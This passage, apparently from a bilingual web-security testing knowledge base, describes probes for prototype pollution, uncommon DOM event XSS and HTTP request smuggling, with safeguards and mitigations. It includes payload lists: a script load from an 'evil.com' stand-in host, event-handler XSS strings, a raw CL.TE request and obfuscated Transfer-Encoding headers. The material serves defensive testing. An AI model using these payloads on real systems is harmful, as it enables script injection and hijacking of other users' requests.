description.zh: 在干净页面记录相关配置对象的自有属性、原型链和正常资源请求，并保存原始请求、响应与服务端关联标识。
description.en: Record own properties, prototype chain, and normal resource requests for relevant configuration objects on a clean page, retaining raw requests, responses, and server correlation identifiers.

title.zh: 执行客户端原型污染到脚本加载变体
title.en: Execute the Client-Side Prototype Pollution to Script Loading variants

description.zh: 逐项执行原始属性结构但将 URL 指向自有空资源，并在隔离浏览器刷新独立页面，严格保持其他变量不变并设置停止阈值。
description.en: Execute original property structures one at a time with URLs pointing to owned empty resources and refresh an isolated page, holding all other variables constant and defining a stop threshold.

attackChain.payload:
<script>Object.prototype.BOOMR = 1;Object.prototype.url='//evil.com/xss.js'</script>
<script>Object.prototype.BOOMR = 1;Object.prototype.url='//evil.com/'</script>
<script>Object.prototype.BOOMR = 1;Object.prototype.url='/xss.js'</script>

title.zh: 核验Object.prototype 污染触发链证据
title.en: Verify evidence for Object.prototype Pollution Trigger Chains

description.zh: 确认后续库通过继承读取污染值，并由该值触发资源请求或分支变化；同时排除仅原型值存在但无人读取、测试脚本自身发起请求或页面刷新清除污染。
description.en: Confirm that later library code reads the inherited polluted value and that it triggers a resource request or branch change; also exclude Prototype values existing without consumers, requests made by the test script itself, or pollution cleared on page refresh.

review.rationale: 原片段属于客户端原型污染及 gadget 触发，应改归原型链污染。

prerequisites.zh: 确认 sanitizer 允许的元素/属性和目标浏览器支持的事件，使用隔离 DOM fixture 与固定 CSP。
prerequisites.en: Confirm sanitizer-allowed elements and attributes and events supported by the target browser, using an isolated DOM fixture and fixed CSP.

prerequisites.zh: 将 alert 替换为只设置随机 DOM canary 的 handler，逐个提供触发事件所需的最小媒体、动画或交互条件。
prerequisites.en: Replace alert with a handler that only sets a random DOM canary, providing the minimum media, animation, or interaction condition for one event at a time.

analysis.zh: 阳性要求不常见事件属性穿过净化器、保留在最终 DOM，并在受支持浏览器的真实事件触发时执行 canary。属性文本出现、元素渲染、事件不受支持、资源从未进入触发状态、CSP 阻止、handler 被剥离或测试脚本主动派发并绕开用户路径都属于假阳性。
analysis.en: Positive evidence requires an uncommon event attribute to survive sanitization, remain in final DOM, and execute the canary when a real supported browser event occurs. Attribute text, rendered elements, unsupported events, resources never reaching trigger state, CSP blocking, stripped handlers, or harness-dispatched events bypassing the user path is a false positive.

opsecTips.zh: 首个真实支持事件设置 canary 后停止，不测试凭据读取、导航或网络请求。
opsecTips.en: Stop after the first genuinely supported event sets the canary; do not test credential reads, navigation, or network requests.

opsecTips.zh: 删除元素/媒体 fixture 和浏览器 profile，清理缓存与事件 trace，并恢复事件属性白名单和 CSP。
opsecTips.en: Delete element and media fixtures and browser profiles, clear caches and event traces, and restore event-attribute allowlisting and CSP.

name.zh: 冷门 DOM 事件处理器 XSS

description.zh: 使用 SVG、媒体和表单的冷门事件属性检查净化器是否只过滤常见 onload/onerror。
description.en: Uses uncommon SVG, media, and form event attributes to test whether sanitizers block only common onload and onerror handlers.

overview.zh: 原始集合覆盖动画、媒体状态和交互事件，必须针对可触发元素与浏览器支持矩阵逐项验证。本条按浏览器解析与脚本执行边界审查；应把所有外部地址和敏感动作替换为自有无害标记，在真实浏览器记录最终 DOM、CSP 与调用栈。
overview.en: The original set covers animation, media-state, and interaction events and requires per-element validation against browser support. This entry is reviewed as a browser parsing and script-execution boundary; Replace external destinations and sensitive actions with owned harmless markers and record final DOM, CSP, and stack traces in a real browser.

vulnerability.zh: 若净化器依赖不完整事件黑名单，未覆盖的 on* 属性可能在用户交互或媒体状态变化时执行脚本。确认标准是确认事件由目标元素产生并在页面源上下文执行标记代码；属性留在 DOM 但浏览器不支持、事件未触发或扩展注入处理器不能作为漏洞证据。
vulnerability.en: If a sanitizer relies on an incomplete event blacklist, an uncovered on* attribute may execute script on interaction or media-state changes. Confirmation requires Confirm that the event originates from the target element and executes marker code in the page origin; Attributes remaining in the DOM but unsupported, events never firing, or handlers injected by extensions is not vulnerability evidence.

exploitation.zh: 1. 记录目标净化器对安全元素和常见 onerror 属性的移除结果与 DOM 输出；2. 逐项提交原始事件属性，将动作替换为随机 DOM 标记并触发对应无害事件；3. 确认事件由目标元素产生并在页面源上下文执行标记代码。属性留在 DOM 但浏览器不支持、事件未触发或扩展注入处理器应记录为误报。
exploitation.en: 1. Record sanitizer and DOM output for safe elements and a common onerror attribute. 2. Submit original event attributes one at a time, replace actions with a random DOM marker, and trigger the matching harmless event. 3. Confirm that the event originates from the target element and executes marker code in the page origin. Treat Attributes remaining in the DOM but unsupported, events never firing, or handlers injected by extensions as false positives.

mitigation.zh: 1. 采用允许列表净化 HTML 元素和属性，默认移除所有 on* 属性；2. 使用事件监听器绑定固定代码而非拼接输入；3. 部署 CSP 与 Trusted Types 并覆盖浏览器事件矩阵。
mitigation.en: 1. Sanitize HTML with element and attribute allowlists and remove all on* attributes by default. 2. Bind fixed code with event listeners rather than concatenating input. 3. Deploy CSP and Trusted Types and test the browser event matrix.

title.zh: 建立事件属性覆盖面基线
title.en: Establish the Event-Attribute Coverage baseline

description.zh: 记录目标净化器对安全元素和常见 onerror 属性的移除结果与 DOM 输出，并保存原始请求、响应与服务端关联标识。
description.en: Record sanitizer and DOM output for safe elements and a common onerror attribute, retaining raw requests, responses, and server correlation identifiers.

title.zh: 执行事件属性覆盖面变体
title.en: Execute the Event-Attribute Coverage variants

description.zh: 逐项提交原始事件属性，将动作替换为随机 DOM 标记并触发对应无害事件，严格保持其他变量不变并设置停止阈值。
description.en: Submit original event attributes one at a time, replace actions with a random DOM marker, and trigger the matching harmless event, holding all other variables constant and defining a stop threshold.

attackChain.payload:
<svg onbegin=alert(1)>
<svg onend=alert(1)>
<svg onrepeat=alert(1)>
<video onabort=alert(1)>
<video oncanplay=alert(1)>
<video oncanplaythrough=alert(1)>
<video ondurationchange=alert(1)>
<video onemptied=alert(1)>
<video onended=alert(1)>
<video onerror=alert(1)>
<video onloadeddata=alert(1)>
<video onloadedmetadata=alert(1)>
<video onloadstart=alert(1)>
<video onpause=alert(1)>
<video onplay=alert(1)>
<video onplaying=alert(1)>
<video onprogress=alert(1)>
<video onratechange=alert(1)>
<video onseeked=alert(1)>
<video onseeking=alert(1)>

title.zh: 核验冷门 DOM 事件处理器 XSS证据
title.en: Verify evidence for Uncommon DOM Event-Handler XSS

description.zh: 确认事件由目标元素产生并在页面源上下文执行标记代码；同时排除属性留在 DOM 但浏览器不支持、事件未触发或扩展注入处理器。
description.en: Confirm that the event originates from the target element and executes marker code in the page origin; also exclude Attributes remaining in the DOM but unsupported, events never firing, or handlers injected by extensions.

review.rationale: 原集合是事件处理器 XSS 载荷，归入 XSS。

prerequisites.zh: 仅在无共享用户的可销毁前端/后端链中测试，记录两层 HTTP parser 版本、连接复用和超时。
prerequisites.en: Test only on a disposable front-end and back-end chain without shared users, recording both HTTP parser versions, connection reuse, and timeouts.

prerequisites.zh: 使用随机不存在路径和唯一后端 canary 请求替代敏感目标，捕获原始 TCP 字节、前端转发与后端请求边界。
prerequisites.en: Replace sensitive targets with random nonexistent paths and a unique backend canary request, capturing raw TCP bytes, front-end forwarding, and backend request boundaries.

analysis.zh: 阳性要求前端按 Content-Length 定界而后端按 chunked 定界，使零块后的 canary 字节被后端解析为独立请求，双层日志和连接 ID 一致。单个请求 400、连接挂起、前端/后端均拒绝、响应不同步但无第二请求、canary 由测试器另发或超时都不是 CL.TE 走私。
analysis.en: Positive evidence requires the front end to frame by Content-Length while the back end frames by chunked, causing canary bytes after the zero chunk to become a separate backend request with matching tier logs and connection ID. One HTTP 400, a hanging connection, rejection by both tiers, response desynchronization without a second request, a canary sent separately by the harness, or timeout is not CL.TE smuggling.

opsecTips.zh: 后端首次记录一个无害 canary 独立请求后停止，不放入真实路径、Header 或其他用户连接。
opsecTips.en: Stop after the backend first records one harmless canary as a separate request; do not use real paths, headers, or other users' connections.

opsecTips.zh: 关闭测试连接与进程，清空队列/访问日志和连接池，重建环境并恢复统一消息定界拒绝。
opsecTips.en: Close test connections and processes, clear queues, access logs, and connection pools, rebuild the environment, and restore consistent message-framing rejection.

name.zh: CL.TE 请求走私探测

description.zh: 验证前端按 Content-Length、后端按 Transfer-Encoding 定界时是否产生剩余请求字节。
description.en: Tests whether front-end Content-Length framing and back-end Transfer-Encoding framing leave residual request bytes.

overview.zh: 原始请求同时携带 Content-Length 与 chunked，并在零块后附加标记，专门测试 CL.TE 解析分歧。本条按多层 HTTP 消息定界审查；应仅在无共享用户的一次性前后端链路测试，使用无害随机路径并保留原始连接字节与两层日志。
overview.en: The original request carries both Content-Length and chunked framing with a marker after the zero chunk to test a CL.TE parsing differential. This entry is reviewed as a multi-tier HTTP message framing; Test only on a disposable front-end and back-end chain with no shared users, harmless random paths, raw connection bytes, and logs from both tiers.

vulnerability.zh: 若前后端采用不同消息长度，攻击者控制的剩余字节可能成为下一请求前缀并影响其他用户连接。确认标准是通过后端访问日志和下一请求响应确认零块后的字节被解析为独立请求；网关直接 400、连接关闭、客户端重试或仅扫描器超时不能作为漏洞证据。
vulnerability.en: If front and back ends choose different message lengths, attacker-controlled residual bytes may prefix the next request and affect another connection. Confirmation requires Confirm in backend access logs and the next response that bytes after the zero chunk were parsed as a separate request; Immediate gateway 400 responses, closed connections, client retries, or scanner timeouts only is not vulnerability evidence.

exploitation.zh: 1. 在一次性环境记录正常 POST、单一 Content-Length 和单一 chunked 请求的连接复用行为；2. 发送原始 CL.TE 结构但将走私内容替换为无害随机路径，并每次使用受控连接；3. 通过后端访问日志和下一请求响应确认零块后的字节被解析为独立请求。网关直接 400、连接关闭、客户端重试或仅扫描器超时应记录为误报。
exploitation.en: 1. Record connection reuse for normal POST, Content-Length-only, and chunked-only requests in a disposable environment. 2. Send the original CL.TE structure with the smuggled content replaced by a harmless random path and use controlled connections. 3. Confirm in backend access logs and the next response that bytes after the zero chunk were parsed as a separate request. Treat Immediate gateway 400 responses, closed connections, client retries, or scanner timeouts only as false positives.

mitigation.zh: 1. 在边缘拒绝同时含 CL 与 TE 的歧义请求；2. 前后端使用一致严格的 HTTP 解析并优先端到端 HTTP/2；3. 关闭不必要连接复用并监控异常定界错误。
mitigation.en: 1. Reject ambiguous requests containing both CL and TE at the edge. 2. Use consistent strict HTTP parsing across tiers and prefer end-to-end HTTP/2. 3. Disable unnecessary connection reuse and monitor abnormal framing errors.

title.zh: 建立Content-Length/Transfer-Encoding 分歧基线
title.en: Establish the Content-Length and Transfer-Encoding Differential baseline

description.zh: 在一次性环境记录正常 POST、单一 Content-Length 和单一 chunked 请求的连接复用行为，并保存原始请求、响应与服务端关联标识。
description.en: Record connection reuse for normal POST, Content-Length-only, and chunked-only requests in a disposable environment, retaining raw requests, responses, and server correlation identifiers.

title.zh: 执行Content-Length/Transfer-Encoding 分歧变体
title.en: Execute the Content-Length and Transfer-Encoding Differential variants

description.zh: 发送原始 CL.TE 结构但将走私内容替换为无害随机路径，并每次使用受控连接，严格保持其他变量不变并设置停止阈值。
description.en: Send the original CL.TE structure with the smuggled content replaced by a harmless random path and use controlled connections, holding all other variables constant and defining a stop threshold.

attackChain.payload:
POST / HTTP/1.1
Host: target.com
Content-Length: 13
Transfer-Encoding: chunked
0
SMUGGLED

title.zh: 核验CL.TE 请求走私探测证据
title.en: Verify evidence for CL.TE Request Smuggling Probe

description.zh: 通过后端访问日志和下一请求响应确认零块后的字节被解析为独立请求；同时排除网关直接 400、连接关闭、客户端重试或仅扫描器超时。
description.en: Confirm in backend access logs and the next response that bytes after the zero chunk were parsed as a separate request; also exclude Immediate gateway 400 responses, closed connections, client retries, or scanner timeouts only.

review.rationale: 原命令是明确的 CL.TE 请求走私探测。

prerequisites.zh: 搭建隔离双层 HTTP/1.1 链，确认每层对重复 Transfer-Encoding、大小写和合并规则的实现。
prerequisites.en: Build an isolated two-tier HTTP/1.1 chain and identify each tier's handling of duplicate Transfer-Encoding, case, and merging.

prerequisites.zh: 使用唯一随机路径作为残留请求，记录原始 Header 顺序、前端规范化输出和后端实际消息数。
prerequisites.en: Use a unique random path as the residual request, recording raw header order, front-end normalized output, and actual backend message count.

analysis.zh: 阳性是两层对重复 TE 的首值/末值/合并选择不同，导致后端在同一连接上解析额外 canary 请求或边界错位，日志可重放。Header 大小写被标准化、统一拒绝 unknown coding、400、连接关闭、响应数量变化但无后端额外请求或仅 parser 单元测试差异均是假阳性。
analysis.en: Positive evidence is tiers selecting first, last, or merged duplicate TE differently so the backend parses an extra canary request or shifted boundary on the same connection, reproducible in logs. Case normalization, uniform unknown-coding rejection, HTTP 400, connection close, response-count variance without an extra backend request, or parser-unit differences alone is a false positive.

opsecTips.zh: 一个 TE.TE 组合首次形成额外 canary 请求后停止，不增加多请求队列或目标其他 handler。
opsecTips.en: Stop after one TE.TE combination first forms an extra canary request; do not add request queues or target other handlers.

opsecTips.zh: 终止连接，清除后端队列与 trace，重启双层服务并恢复入口拒绝重复/非规范 TE。
opsecTips.en: Terminate connections, clear backend queues and traces, restart both tiers, and restore ingress rejection of duplicate or noncanonical TE.

name.zh: TE.TE 重复头解析差异

description.zh: 使用重复且大小写不同的 Transfer-Encoding 头检查前后端选择首值、末值或合并值的差异。
description.en: Uses duplicate Transfer-Encoding headers with varied casing to test first-value, last-value, or merge differences across HTTP tiers.

overview.zh: 原集合以 cow 与 chunked 的重复排列制造 TE.TE 差异，重点是头部合并和大小写规范化。本条按多层 HTTP 消息定界审查；应仅在无共享用户的一次性前后端链路测试，使用无害随机路径并保留原始连接字节与两层日志。
overview.en: The original set arranges cow and chunked across duplicate headers to create TE.TE ambiguity in header merging and case normalization. This entry is reviewed as a multi-tier HTTP message framing; Test only on a disposable front-end and back-end chain with no shared users, harmless random paths, raw connection bytes, and logs from both tiers.

vulnerability.zh: 若一个解析器识别 chunked 而另一个采用未知编码，双方会对请求结束位置产生不同判断。确认标准是比较边缘与后端解析日志，确认双方选择了不同 Transfer-Encoding 值；所有层统一拒绝、规范化后只保留一个值或连接因未知编码关闭不能作为漏洞证据。
vulnerability.en: If one parser recognizes chunked while another selects an unknown coding, the tiers disagree about request boundaries. Confirmation requires Compare edge and backend parser logs to confirm that the tiers selected different Transfer-Encoding values; Uniform rejection, normalization to one value, or connection closure due to unknown coding is not vulnerability evidence.

exploitation.zh: 1. 记录单一合法 chunked、单一未知编码和重复相同 TE 头的拒绝或接受行为；2. 逐项发送原始重复 TE 顺序，在无共享用户的测试连接中附加无害边界标记；3. 比较边缘与后端解析日志，确认双方选择了不同 Transfer-Encoding 值。所有层统一拒绝、规范化后只保留一个值或连接因未知编码关闭应记录为误报。
exploitation.en: 1. Record acceptance or rejection for one valid chunked header, one unknown coding, and duplicate identical TE headers. 2. Send original duplicate-TE orders one at a time with a harmless boundary marker on a test connection with no shared users. 3. Compare edge and backend parser logs to confirm that the tiers selected different Transfer-Encoding values. Treat Uniform rejection, normalization to one value, or connection closure due to unknown coding as false positives.

mitigation.zh: 1. 拒绝重复、未知和非规范 Transfer-Encoding；2. 禁止代理以不同规则合并 TE 头；3. 在升级代理或服务器时运行重复头差异测试。
mitigation.en: 1. Reject duplicate, unknown, and noncanonical Transfer-Encoding. 2. Prevent proxies from merging TE headers with divergent rules. 3. Run duplicate-header differential tests on proxy or server upgrades.

title.zh: 建立Transfer-Encoding 多值混淆基线
title.en: Establish the Transfer-Encoding Multi-Value Ambiguity baseline

description.zh: 记录单一合法 chunked、单一未知编码和重复相同 TE 头的拒绝或接受行为，并保存原始请求、响应与服务端关联标识。
description.en: Record acceptance or rejection for one valid chunked header, one unknown coding, and duplicate identical TE headers, retaining raw requests, responses, and server correlation identifiers.

title.zh: 执行Transfer-Encoding 多值混淆变体
title.en: Execute the Transfer-Encoding Multi-Value Ambiguity variants

description.zh: 逐项发送原始重复 TE 顺序，在无共享用户的测试连接中附加无害边界标记，严格保持其他变量不变并设置停止阈值。
description.en: Send original duplicate-TE orders one at a time with a harmless boundary marker on a test connection with no shared users, holding all other variables constant and defining a stop threshold.

attackChain.payload:
Transfer-Encoding: cow
Transfer-encoding: chunked
transfer-encoding: cow
Transfer-encoding: cow

title.zh: 核验TE.TE 重复头解析差异证据
title.en: Verify evidence for TE.TE Duplicate-Header Parsing Differential

description.zh: 比较边缘与后端解析日志，确认双方选择了不同 Transfer-Encoding 值；同时排除所有层统一拒绝、规范化后只保留一个值或连接因未知编码关闭。
description.en: Compare edge and backend parser logs to confirm that the tiers selected different Transfer-Encoding values; also exclude Uniform rejection, normalization to one value, or connection closure due to unknown coding.

review.rationale: 原命令是 TE.TE 请求走私边界测试。

prerequisites.zh: 在专用代理/源站链记录 parser 与 RFC 配置，禁用真实流量和共享 keep-alive，并捕获原始字节。
prerequisites.en: Record parsers and RFC configuration in a dedicated proxy-origin chain, disabling real traffic and shared keep-alive while capturing raw bytes.

prerequisites.zh: 为大小写、空白、逗号顺序和未知 coding 逐项使用同一无害 body/canary，配对规范 chunked 和明确拒绝请求。
prerequisites.en: Use the same harmless body and canary for case, whitespace, comma order, and unknown coding one at a time, paired with canonical chunked and explicit-rejection controls.

analysis.zh: 阳性要求一个语法变体在前后端产生不同消息长度或请求数量，使唯一 canary 成为独立后端请求，且可定位到具体规范化差异。某层接受非规范 Header、返回 400、未知 coding 错误、连接关闭、正文截断、单层 parser 行为或响应延迟都不能单独证明请求走私。
analysis.en: Positive evidence requires one syntax variant to produce different message lengths or request counts at front and back ends, making the unique canary a separate backend request and localizing the normalization difference. One tier accepting a noncanonical header, HTTP 400, unknown-coding errors, connection close, truncated body, single-parser behavior, or response delay alone does not prove request smuggling.

opsecTips.zh: 首次观察到后端额外 canary 请求后停止，不组合多个 TE 变体或复用其他用户连接。
opsecTips.en: Stop after first observing an extra backend canary request; do not combine TE variants or reuse another user's connection.

opsecTips.zh: 关闭所有测试 socket，清空连接池/日志并重启链路，恢复严格 Header 语法和端到端定界一致性。
opsecTips.en: Close all test sockets, clear connection pools and logs, restart the chain, and restore strict header syntax and end-to-end framing consistency.

name.zh: Transfer-Encoding 语法混淆

description.zh: 使用大小写、空白、分隔符和组合编码变体检查 HTTP 链路对 Transfer-Encoding 的解析是否一致。
description.en: Uses casing, whitespace, separators, and combined codings to test consistent Transfer-Encoding parsing across an HTTP chain.

overview.zh: 原始集合覆盖 chunked 与未知值的顺序、头名大小写和异常空白，适合解析器差异矩阵。本条按多层 HTTP 消息定界审查；应仅在无共享用户的一次性前后端链路测试，使用无害随机路径并保留原始连接字节与两层日志。
overview.en: The original set covers ordering of chunked and unknown values, header-name casing, and abnormal whitespace for parser differential matrices. This entry is reviewed as a multi-tier HTTP message framing; Test only on a disposable front-end and back-end chain with no shared users, harmless random paths, raw connection bytes, and logs from both tiers.

vulnerability.zh: 若代理与源站对非规范 TE 语法接受度不同，请求定界可能分叉并形成走私条件。确认标准是确认边缘与后端对同一变体的接受、正文长度或连接复用判断不同；统一拒绝、错误页差异但连接已关闭或客户端自动规范化头部不能作为漏洞证据。
vulnerability.en: If proxy and origin accept noncanonical TE syntax differently, request framing may diverge and create smuggling conditions. Confirmation requires Confirm differences in acceptance, body length, or connection reuse decisions between edge and backend; Uniform rejection, error-page differences with closed connections, or client-side header normalization is not vulnerability evidence.

exploitation.zh: 1. 分别记录规范 chunked 与明确无效 TE 请求在每一层的状态和连接处理；2. 逐项发送原始 TE 变体，使用短无害正文和唯一连接标识观察解析；3. 确认边缘与后端对同一变体的接受、正文长度或连接复用判断不同。统一拒绝、错误页差异但连接已关闭或客户端自动规范化头部应记录为误报。
exploitation.en: 1. Record status and connection handling at each layer for canonical chunked and clearly invalid TE requests. 2. Send original TE variants one at a time with a short harmless body and unique connection identifier. 3. Confirm differences in acceptance, body length, or connection reuse decisions between edge and backend. Treat Uniform rejection, error-page differences with closed connections, or client-side header normalization as false positives.

mitigation.zh: 1. 仅接受规范且最终为 chunked 的合法编码语法；2. 删除歧义空白并拒绝未知组合而不是容错；3. 在原始字节级别记录和测试多层解析结果。
mitigation.en: 1. Accept only canonical valid transfer codings with chunked in the permitted position. 2. Reject unknown combinations and ambiguous whitespace instead of tolerating them. 3. Log and test multi-tier parsing at the raw-byte level.

title.zh: 建立TE 规范化差异基线
title.en: Establish the Transfer-Encoding Normalization Differential baseline

description.zh: 分别记录规范 chunked 与明确无效 TE 请求在每一层的状态和连接处理，并保存原始请求、响应与服务端关联标识。
description.en: Record status and connection handling at each layer for canonical chunked and clearly invalid TE requests, retaining raw requests, responses, and server correlation identifiers.

title.zh: 执行TE 规范化差异变体
title.en: Execute the Transfer-Encoding Normalization Differential variants

description.zh: 逐项发送原始 TE 变体，使用短无害正文和唯一连接标识观察解析，严格保持其他变量不变并设置停止阈值。
description.en: Send original TE variants one at a time with a short harmless body and unique connection identifier, holding all other variables constant and defining a stop threshold.

attackChain.payload:
Transfer-Encoding: chunked, cow
Transfer-Encoding: cow, chunked
transfer-encoding: chunked
TRANSFER-ENCODING: chunked
Transfer-Encoding : chunked
Transfer-Encoding:  chunked
Transfer-Encoding: chunked\t
Transfer-Encoding: \tchunked
Transfer-Encoding: chunked\r\n
Transfer-Encoding: \r\nchunked
Transfer-Encoding: chunked\r\n\r\n
Transfer-Encoding: \r\n\r\nchunked
Transfer-Encoding: chunked%00
Transfer-Encoding: %00chunked
Transfer-Encoding: chunked%09
Transfer-Encoding: %09chunked
Transfer-Encoding: chunked%0d
Transfer-Encoding: %0dchunked
Transfer-Encoding: chunked%0a
Transfer-Encoding: %0achunked
Transfer-Encoding: chunked%0d%0a
Transfer-Encoding: %0d%0achunked

title.zh: 核验Transfer-Encoding 语法混淆证据
title.en: Verify evidence for Transfer-Encoding Syntax Ambiguity

description.zh: 确认边缘与后端对同一变体的接受、正文长度或连接复用判断不同；同时排除统一拒绝、错误页差异但连接已关闭或客户端自动规范化头部。
description.en: Confirm differences in acceptance, body length, or connection reuse decisions between edge and backend; also exclude Uniform rejection, error-page differences with closed connections, or client-side header normalization.

review.rationale: 原头部变体是请求走私解析器差异载荷。

prerequisites.zh: 使用仅含测试流量的 HTTP/2 边缘到 HTTP/1 后端降级链，记录 H2 pseudo-header、合成 CL 与后端原始请求。
prerequisites.en: Use an HTTP/2 edge to HTTP/1 backend downgrade chain carrying only test traffic, recording H2 pseudo-headers, synthesized Content-Length, and raw backend requests.

prerequisites.zh: 以固定短 body 和随机 canary 路径测试冲突长度，配对单一正确长度与入口拒绝控制，禁用连接共享。
prerequisites.en: Test conflicting lengths with a fixed short body and random canary path, paired with one correct length and ingress-rejection controls, with connection sharing disabled.

analysis.zh: 阳性要求 H2 边缘接受冲突长度并在降级时生成歧义 H1 framing，使后端解析额外 canary 或下一请求被前缀污染，跨层 stream/connection ID 可关联。H2 协议错误、边缘删除重复 CL、400、body 长度不匹配、单次 reset 或没有后端第二请求都不是降级走私。
analysis.en: Positive evidence requires the H2 edge to accept conflicting lengths and synthesize ambiguous H1 framing during downgrade so the backend parses an extra canary or prefixes the next request, correlated by stream and connection IDs. H2 protocol errors, duplicate-CL removal, HTTP 400, body-length mismatch, one stream reset, or no second backend request is not downgrade smuggling.

opsecTips.zh: 首次形成一个额外 canary 后端请求后停止，不并发 H2 stream 或目标真实路径。
opsecTips.en: Stop after first forming one extra canary backend request; do not add concurrent H2 streams or target real paths.

opsecTips.zh: 关闭 H2 会话，清空降级代理/后端连接池和 trace，重建测试链并恢复冲突长度拒绝。
opsecTips.en: Close H2 sessions, clear downgrade-proxy and backend pools and traces, rebuild the test chain, and restore rejection of conflicting lengths.

name.zh: HTTP/2 长度冲突走私探测

description.zh: 使用冲突 Content-Length 检查 HTTP/2 到 HTTP/1 降级过程中是否生成歧义正文长度。
description.en: Uses conflicting Content-Length values to test whether HTTP/2-to-HTTP/1 downgrade creates ambiguous body framing.

overview.zh: 原始结构在 HTTP/2 请求中放置重复长度并附带正文，重点是边缘降级如何重建 HTTP/1 请求。本条按多层 HTTP 消息定界审查；应仅在无共享用户的一次性前后端链路测试，使用无害随机路径并保留原始连接字节与两层日志。
overview.en: The original structure places duplicate lengths in an HTTP/2 request with a body, focusing on how edge downgrade reconstructs HTTP/1. This entry is reviewed as a multi-tier HTTP message framing; Test only on a disposable front-end and back-end chain with no shared users, harmless random paths, raw connection bytes, and logs from both tiers.

vulnerability.zh: 若 H2 边缘与 H1 后端对长度和伪头转换不一致，额外字节可能进入后续请求。确认标准是从后端原始请求日志确认降级后长度冲突导致额外请求或正文错位；H2 库拒绝重复长度、边缘重写为单值或仅客户端报协议错误不能作为漏洞证据。
vulnerability.en: If H2 edge and H1 backend disagree on lengths and pseudo-header conversion, extra bytes may enter a subsequent request. Confirmation requires Confirm from raw backend request logs that downgraded length conflicts cause an extra request or body misalignment; H2 libraries rejecting duplicate lengths, edge rewriting to one value, or client-only protocol errors is not vulnerability evidence.

exploitation.zh: 1. 记录端到端 H2 与 H2-to-H1 降级链路上的正常 POST 和单一长度请求；2. 逐项发送原始重复长度结构并使用随机无害正文，在隔离连接追踪降级字节；3. 从后端原始请求日志确认降级后长度冲突导致额外请求或正文错位。H2 库拒绝重复长度、边缘重写为单值或仅客户端报协议错误应记录为误报。
exploitation.en: 1. Record normal POST and single-length behavior over end-to-end H2 and H2-to-H1 downgrade paths. 2. Send original duplicate-length structures one at a time with a random harmless body and trace downgraded bytes on isolated connections. 3. Confirm from raw backend request logs that downgraded length conflicts cause an extra request or body misalignment. Treat H2 libraries rejecting duplicate lengths, edge rewriting to one value, or client-only protocol errors as false positives.

mitigation.zh: 1. 在 H2 边缘拒绝重复或冲突 Content-Length；2. 使用安全一致的降级实现或端到端保持 HTTP/2；3. 对伪头、长度和正文转换建立字节级回归测试。
mitigation.en: 1. Reject duplicate or conflicting Content-Length at the H2 edge. 2. Use a safe consistent downgrade implementation or keep HTTP/2 end to end. 3. Add byte-level regression tests for pseudo-headers, lengths, and body conversion.

title.zh: 建立H2 降级请求定界基线
title.en: Establish the HTTP/2 Downgrade Framing baseline

description.zh: 记录端到端 H2 与 H2-to-H1 降级链路上的正常 POST 和单一长度请求，并保存原始请求、响应与服务端关联标识。
description.en: Record normal POST and single-length behavior over end-to-end H2 and H2-to-H1 downgrade paths, retaining raw requests, responses, and server correlation identifiers.

title.zh: 执行H2 降级请求定界变体
title.en: Execute the HTTP/2 Downgrade Framing variants

description.zh: 逐项发送原始重复长度结构并使用随机无害正文，在隔离连接追踪降级字节，严格保持其他变量不变并设置停止阈值。
description.en: Send original duplicate-length structures one at a time with a random harmless body and trace downgraded bytes on isolated connections, holding all other variables constant and defining a stop threshold.

attackChain.payload:
POST / HTTP/2
Content-Length: 0
Content-Length: 10
x=1

title.zh: 核验HTTP/2 长度冲突走私探测证据
title.en: Verify evidence for HTTP/2 Length-Conflict Smuggling Probe

description.zh: 从后端原始请求日志确认降级后长度冲突导致额外请求或正文错位；同时排除H2 库拒绝重复长度、边缘重写为单值或仅客户端报协议错误。
description.en: Confirm from raw backend request logs that downgraded length conflicts cause an extra request or body misalignment; also exclude H2 libraries rejecting duplicate lengths, edge rewriting to one value, or client-only protocol errors.

review.rationale: 原命令是 HTTP/2 降级走私探测。

prerequisites.zh: 在可销毁双层链为每个 API 候选建立无敏感随机 canary handler，并确保没有共享用户或生产路由。
prerequisites.en: Create a nonsensitive random canary handler for each API candidate in a disposable two-tier chain, with no shared users or production routes.

prerequisites.zh: 先用已确认的最小 framing 差异，再逐个替换 smuggled 目标，记录前端一请求与后端请求数/路径。
prerequisites.en: Start from a confirmed minimal framing differential, then replace the smuggled target one at a time, recording one front-end request versus backend request count and path.

analysis.zh: 阳性影响证据是残留字节成为独立后端请求并命中指定 API canary，且该请求未作为正常前端请求出现。API 路径存在、Content-Length 文本被记录、前端返回两个响应、后端 404、测试器随后正常请求同路径或没有连接 ID 关联都不是走私影响。
analysis.en: Positive impact evidence is residual bytes becoming a separate backend request that hits the designated API canary without appearing as a normal front-end request. API route existence, logged Content-Length text, two front-end responses, backend HTTP 404, the harness later requesting the same path normally, or absent connection-ID correlation is not smuggling impact.

opsecTips.zh: 一个 API canary 首次由走私请求命中后停止，不替换成用户、配置或管理真实端点。
opsecTips.en: Stop after one API canary is first hit by the smuggled request; do not replace it with real user, configuration, or administration endpoints.

opsecTips.zh: 删除 canary 路由，关闭连接并清空队列/日志，重启前后端链以移除任何残留请求。
opsecTips.en: Delete canary routes, close connections and clear queues and logs, and restart both tiers to remove any residual requests.

name.zh: API 路由请求走私验证

description.zh: 把 API 用户、管理和配置路径作为无害走私目标，验证后端是否把剩余字节解析为独立请求。
description.en: Uses API user, administration, and configuration paths as harmless smuggled targets to test whether residual bytes become separate requests.

overview.zh: 原集合由 Content-Length 和多个 API 请求行组成，属于走私影响验证而不是 API 内容发现字典。本条按多层 HTTP 消息定界审查；应仅在无共享用户的一次性前后端链路测试，使用无害随机路径并保留原始连接字节与两层日志。
overview.en: The original set combines Content-Length lines with API request targets and is for smuggling impact validation rather than API discovery. This entry is reviewed as a multi-tier HTTP message framing; Test only on a disposable front-end and back-end chain with no shared users, harmless random paths, raw connection bytes, and logs from both tiers.

vulnerability.zh: 若走私字节可命中后端 API，攻击者可能绕过前端路由控制或污染下一用户请求。确认标准是确认后端记录了未经过正常前端请求 ID 的独立 API 请求，并关联连接顺序；扫描器直接发送第二请求、前端预取、重试或正常 API 调用不能作为漏洞证据。
vulnerability.en: If smuggled bytes reach backend APIs, an attacker may bypass front-end routing controls or contaminate the next user's request. Confirmation requires Confirm that the backend records a separate API request without the normal front-end request ID and correlate connection order; Scanner-sent second requests, edge prefetches, retries, or normal API calls is not vulnerability evidence.

